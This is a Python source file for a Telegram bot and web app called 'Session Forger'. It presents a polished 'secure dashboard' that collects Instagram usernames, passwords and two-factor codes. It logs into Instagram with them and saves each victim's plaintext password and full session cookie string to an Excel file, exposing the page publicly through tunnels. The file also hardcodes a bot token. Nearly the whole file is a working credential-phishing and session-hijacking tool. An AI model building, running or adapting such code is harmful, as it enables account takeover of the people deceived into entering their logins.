import sys
import os
import subprocess
import time
import logging
import json
import threading
import signal
import uuid
import shutil
import re
from typing import Optional

# --- Configuration ---
BOT_TOKEN = "8591242778:AAHpyMLfltgl5ufLfI8f0QAyBklm_Kn3Q4I"
PORT = 8000

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("session_bot.log", mode='a')
    ]
)
logger = logging.getLogger(__name__)

# --- Runtime Dependency Check ---
REQUIRED_PACKAGES = [
    "fastapi", "uvicorn", "instaloader", "pandas", "openpyxl",
    "python-multipart", "pyTelegramBotAPI", "requests"
]

def install_dependencies():
    for package in REQUIRED_PACKAGES:
        try:
            # Map package names to import names
            import_name = package
            if package == "pyTelegramBotAPI": import_name = "telebot"
            if package == "python-multipart": import_name = "multipart" # technically python_multipart but check is loose

            # Simple check
            if package == "python-multipart":
                 # checking pip freeze or just assume install if ImportError on multipart
                 try:
                     import python_multipart
                 except ImportError:
                     raise ImportError
            else:
                 __import__(import_name)

        except ImportError:
            logger.info(f"📦 Package '{package}' not found. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                logger.info(f"✅ '{package}' installed successfully.")
            except Exception as e:
                logger.error(f"Failed to install {package}: {e}")

install_dependencies()

# Imports after installation
import telebot
from telebot.types import MenuButtonWebApp, WebAppInfo
import instaloader
from fastapi import FastAPI, Request, UploadFile, Form, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import requests
import pandas as pd

# --- Global State ---
# Store pending logins: { "session_token": { "instaloader_context": L, "username": str } }
pending_logins = {}

# --- Telegram Bot Setup ---
bot = telebot.TeleBot(BOT_TOKEN)
tunnel_url = None

@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    if not tunnel_url:
        bot.send_message(chat_id, "⚠️ System is starting up. Please wait...")
        return

    # Fix for MenuButtonWebApp error: provide 'type'
    try:
        web_app_info = WebAppInfo(url=tunnel_url)
        # Explicitly passing 'type' to satisfy the library requirement
        menu_button = MenuButtonWebApp(type='web_app', text="Open App", web_app=web_app_info)
        bot.set_chat_menu_button(chat_id, menu_button)
    except Exception as e:
        logger.error(f"Failed to set menu button: {e}")

    # Inline button
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("Open Web App", web_app=web_app_info))

    bot.send_message(
        chat_id,
        "🚀 *Welcome to the Session Manager*\n\nClick the button below to access the secure dashboard.",
        parse_mode="Markdown",
        reply_markup=markup
    )

# --- FastAPI Setup ---
app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# HTML Template (Dark, Cyberpunk)
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Session Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; background-color: #0f172a; color: #e2e8f0; }
        h1, h2, h3 { font-family: 'Orbitron', sans-serif; }
        .cyber-input {
            background: #1e293b; border: 1px solid #334155; color: #fff;
            transition: all 0.3s;
        }
        .cyber-input:focus {
            border-color: #0ea5e9; box-shadow: 0 0 10px rgba(14, 165, 233, 0.5);
        }
        .cyber-btn {
            background: linear-gradient(45deg, #0ea5e9, #6366f1);
            color: white; font-weight: bold; text-transform: uppercase;
            letter-spacing: 1px; transition: transform 0.2s, box-shadow 0.2s;
        }
        .cyber-btn:active { transform: scale(0.98); }
        .glass-panel {
            background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        /* Loader */
        .loader {
            border: 4px solid #f3f3f3; border-top: 4px solid #3498db;
            border-radius: 50%; width: 24px; height: 24px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body x-data="appData()" x-init="initApp()">

    <div class="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden">
        <!-- Background accents -->
        <div class="absolute top-[-10%] left-[-10%] w-64 h-64 bg-blue-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob"></div>
        <div class="absolute bottom-[-10%] right-[-10%] w-64 h-64 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob animation-delay-2000"></div>

        <div class="w-full max-w-md glass-panel rounded-2xl p-6 shadow-2xl relative z-10">

            <!-- Header -->
            <div class="text-center mb-8">
                <div class="w-20 h-20 mx-auto bg-gradient-to-tr from-blue-400 to-purple-500 rounded-full flex items-center justify-center shadow-lg mb-4">
                     <!-- Bot Icon Proxy -->
                     <img src="/api/bot-icon" class="w-18 h-18 rounded-full border-2 border-white" alt="Bot">
                </div>
                <h1 class="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-400">
                    Session Forger
                </h1>
                <p class="text-xs text-slate-400 mt-1">Secure Credential Management</p>
            </div>

            <!-- Login Form -->
            <div x-show="step === 'login'" x-transition>
                <form @submit.prevent="submitLogin">
                    <div class="mb-4">
                        <label class="block text-xs font-bold mb-2 text-blue-300">INSTAGRAM USERNAME</label>
                        <input type="text" x-model="username" class="cyber-input w-full p-3 rounded-lg outline-none" placeholder="Enter username" required>
                    </div>
                    <div class="mb-6">
                        <label class="block text-xs font-bold mb-2 text-blue-300">PASSWORD</label>
                        <input type="password" x-model="password" class="cyber-input w-full p-3 rounded-lg outline-none" placeholder="Enter password" required>
                    </div>
                    <button type="submit" class="cyber-btn w-full p-3 rounded-lg shadow-lg flex justify-center items-center" :disabled="loading">
                        <span x-show="!loading">Initialize Session</span>
                        <div x-show="loading" class="loader"></div>
                    </button>
                </form>
            </div>

            <!-- Verification (2FA) Form -->
            <div x-show="step === 'verify'" x-transition style="display: none;">
                <div class="text-center mb-4">
                    <p class="text-sm text-yellow-400 font-semibold">⚠️ Verification Required</p>
                    <p class="text-xs text-slate-400">Please enter the code sent to your device/email.</p>
                </div>
                <form @submit.prevent="submitVerification">
                    <div class="mb-6">
                        <label class="block text-xs font-bold mb-2 text-yellow-300">SECURITY CODE</label>
                        <input type="text" x-model="verificationCode" class="cyber-input w-full p-3 rounded-lg outline-none text-center text-xl tracking-widest" placeholder="123456" required>
                    </div>
                    <button type="submit" class="cyber-btn w-full p-3 rounded-lg shadow-lg flex justify-center items-center" :disabled="loading">
                        <span x-show="!loading">Verify & Continue</span>
                        <div x-show="loading" class="loader"></div>
                    </button>
                </form>
            </div>

            <!-- Success View -->
            <div x-show="step === 'success'" x-transition style="display: none;" class="text-center">
                <div class="text-green-400 text-5xl mb-4">✅</div>
                <h2 class="text-xl font-bold mb-2">Session Created</h2>
                <p class="text-xs text-slate-400 mb-6">Credentials verified and stored securely.</p>
                <button @click="closeApp" class="w-full p-3 bg-slate-700 hover:bg-slate-600 rounded-lg text-white transition">Close</button>
            </div>

            <!-- Error Message -->
            <div x-show="errorMessage" x-transition class="mt-4 p-3 bg-red-900/50 border border-red-500/50 rounded-lg text-red-200 text-sm text-center">
                <span x-text="errorMessage"></span>
            </div>

        </div>
    </div>

    <script>
        function appData() {
            return {
                step: 'login',
                username: '',
                password: '',
                verificationCode: '',
                loading: false,
                errorMessage: '',
                sessionToken: '',

                initApp() {
                    if (window.Telegram && window.Telegram.WebApp) {
                        window.Telegram.WebApp.ready();
                        window.Telegram.WebApp.expand();
                    }
                    this.sessionToken = Math.random().toString(36).substring(2);
                },

                async submitLogin() {
                    this.loading = true;
                    this.errorMessage = '';
                    try {
                        const formData = new FormData();
                        formData.append('username', this.username);
                        formData.append('password', this.password);
                        formData.append('session_token', this.sessionToken);

                        const response = await fetch('/api/login', {
                            method: 'POST',
                            body: formData
                        });
                        const data = await response.json();

                        if (response.ok) {
                            if (data.status === '2fa_required') {
                                this.step = 'verify';
                            } else if (data.status === 'success') {
                                this.step = 'success';
                            }
                        } else {
                            this.errorMessage = data.detail || 'Login failed.';
                        }
                    } catch (e) {
                        this.errorMessage = 'Network error occurred. ' + e;
                    } finally {
                        this.loading = false;
                    }
                },

                async submitVerification() {
                    this.loading = true;
                    this.errorMessage = '';
                    try {
                        const formData = new FormData();
                        formData.append('code', this.verificationCode);
                        formData.append('session_token', this.sessionToken);

                        const response = await fetch('/api/verify_2fa', {
                            method: 'POST',
                            body: formData
                        });
                        const data = await response.json();

                        if (response.ok) {
                            this.step = 'success';
                        } else {
                            this.errorMessage = data.detail || 'Verification failed.';
                        }
                    } catch (e) {
                        this.errorMessage = 'Network error occurred.';
                    } finally {
                        this.loading = false;
                    }
                },

                closeApp() {
                    if (window.Telegram && window.Telegram.WebApp) {
                        window.Telegram.WebApp.close();
                    }
                }
            }
        }
    </script>
</body>
</html>
"""

@app.get("/")
async def get_index():
    return HTMLResponse(content=HTML_CONTENT)

@app.get("/api/bot-icon")
async def get_bot_icon():
    try:
        info = bot.get_me()
        photos = bot.get_user_profile_photos(info.id)
        if photos.total_count > 0:
            file_id = photos.photos[0][0].file_id
            file_info = bot.get_file(file_id)
            url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
            return RedirectResponse(url=url)
    except Exception as e:
        logger.error(f"Error fetching icon: {e}")
    return RedirectResponse(url="https://via.placeholder.com/150")

@app.post("/api/login")
async def api_login(
    username: str = Form(...),
    password: str = Form(...),
    session_token: str = Form(...)
):
    try:
        # Create a new Instaloader instance for this session
        L = instaloader.Instaloader()
        # Custom User Agent to mimic mobile
        L.context._user_agent = "Instagram 269.0.0.18.75 Android (31/12; 320dpi; 720x1280; samsung; SM-A105F; a10; exynos7884; en_US; 314665256)"

        # Try login
        L.login(username, password)

        # If success immediately
        save_session(L, username, password)
        return JSONResponse(content={"status": "success"})

    except instaloader.TwoFactorAuthRequiredException:
        # Store L in memory to resume later
        pending_logins[session_token] = {
            "instance": L,
            "username": username,
            "password": password
        }
        return JSONResponse(content={"status": "2fa_required"})

    except instaloader.ConnectionException as e:
        logger.error(f"Connection error for {username}: {e}")
        # Check if it's a checkpoint challenge
        if "challenge_required" in str(e) or "checkpoint_required" in str(e):
             return JSONResponse(status_code=403, content={"detail": "Verification Checkpoint: Please log in to the official Instagram app to approve this device, then try again."})
        return JSONResponse(status_code=403, content={"detail": f"Connection Error: {e}"})

    except instaloader.BadCredentialsException:
        return JSONResponse(status_code=401, content={"detail": "Invalid username or password."})

    except Exception as e:
        logger.exception(f"Login error for {username}")
        # Handle the specific 'fail' status 'challenge_required' which might come as a generic LoginException
        if "challenge_required" in str(e):
             return JSONResponse(status_code=403, content={"detail": "Verification Checkpoint: Instagram requires you to verify this login. Please approve it on your phone."})
        return JSONResponse(status_code=500, content={"detail": str(e)})

@app.post("/api/verify_2fa")
async def verify_2fa(
    code: str = Form(...),
    session_token: str = Form(...)
):
    if session_token not in pending_logins:
        raise HTTPException(status_code=400, detail="Session expired or invalid.")

    data = pending_logins[session_token]
    L = data["instance"]
    username = data["username"]
    password = data["password"]

    try:
        L.two_factor_login(code)
        save_session(L, username, password)
        del pending_logins[session_token]
        return JSONResponse(content={"status": "success"})
    except Exception as e:
        logger.error(f"2FA failed for {username}: {e}")
        return JSONResponse(status_code=400, content={"detail": "Invalid verification code."})

def save_session(L, username, password):
    # Ensure data directory
    os.makedirs("data", exist_ok=True)

    # Save session file
    filename = f"data/{username}_session"
    L.save_session_to_file(filename=filename)

    # Extract cookies and info
    cookies = "; ".join([f"{c.name}={c.value}" for c in L.context.session.cookies])

    # Save to Excel
    excel_path = f"data/{username}.xlsx"

    data = [{
        "Instagram ID": username,
        "Instagram Password": password,
        "Gmail": "",
        "Gmail Password": "",
        "Full Cookie String": cookies
    }]

    df = pd.DataFrame(data)
    # Check if file exists and overwrite if ID matches
    if os.path.exists(excel_path):
        os.remove(excel_path) # Simple overwrite as per requirement to save per account file

    df.to_excel(excel_path, index=False)
    logger.info(f"Data saved for {username}")

# --- Tunneling ---
def start_tunnel():
    global tunnel_url
    time.sleep(2) # Give server time to start

    # Try Cloudflared
    try:
        # Check architecture
        arch = subprocess.check_output(["uname", "-m"]).decode().strip()
        cf_bin_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        if "aarch64" in arch or "arm" in arch:
             cf_bin_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"

        if not os.path.exists("./cloudflared"):
             logger.info("Downloading Cloudflared...")
             subprocess.run(["wget", "-q", "-O", "cloudflared", cf_bin_url])
             subprocess.run(["chmod", "+x", "cloudflared"])

        logger.info("Starting Cloudflare Tunnel...")
        proc = subprocess.Popen(["./cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Read lines to find URL
        start_time = time.time()
        while time.time() - start_time < 30:
            line = proc.stderr.readline()
            if "trycloudflare.com" in line:
                import re
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    tunnel_url = match.group(0)
                    logger.info(f"✅ Cloudflare Tunnel established: {tunnel_url}")
                    return
            time.sleep(0.1)
    except Exception as e:
        logger.error(f"Cloudflare tunnel failed: {e}")

    # Fallback to localhost.run (SSH)
    try:
        logger.info("Attempting SSH Tunnel (localhost.run)...")
        ssh_cmd = ["ssh", "-R", f"80:localhost:{PORT}", "-o", "StrictHostKeyChecking=no", "nokey@localhost.run"]
        proc = subprocess.Popen(ssh_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        start_time = time.time()
        while time.time() - start_time < 20:
             line = proc.stdout.readline()
             if "lhr.life" in line or "localhost.run" in line:
                 import re
                 match = re.search(r'https://[a-zA-Z0-9-]+\.lhr\.life', line)
                 if match:
                     tunnel_url = match.group(0)
                     logger.info(f"✅ SSH Tunnel established: {tunnel_url}")
                     return
             time.sleep(0.1)
    except Exception as e:
        logger.error(f"SSH tunnel failed: {e}")

# --- Main Execution ---
if __name__ == "__main__":
    # Start Tunnel in background thread
    threading.Thread(target=start_tunnel, daemon=True).start()

    # Start Bot in background thread
    def run_bot():
        while True:
            try:
                logger.info("Telegram Bot started polling")
                bot.polling(none_stop=True)
            except Exception as e:
                logger.error(f"Bot polling error: {e}")
                time.sleep(5)

    threading.Thread(target=run_bot, daemon=True).start()

    # Start Web Server
    logger.info(f"Web Server started on port {PORT}")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="error")
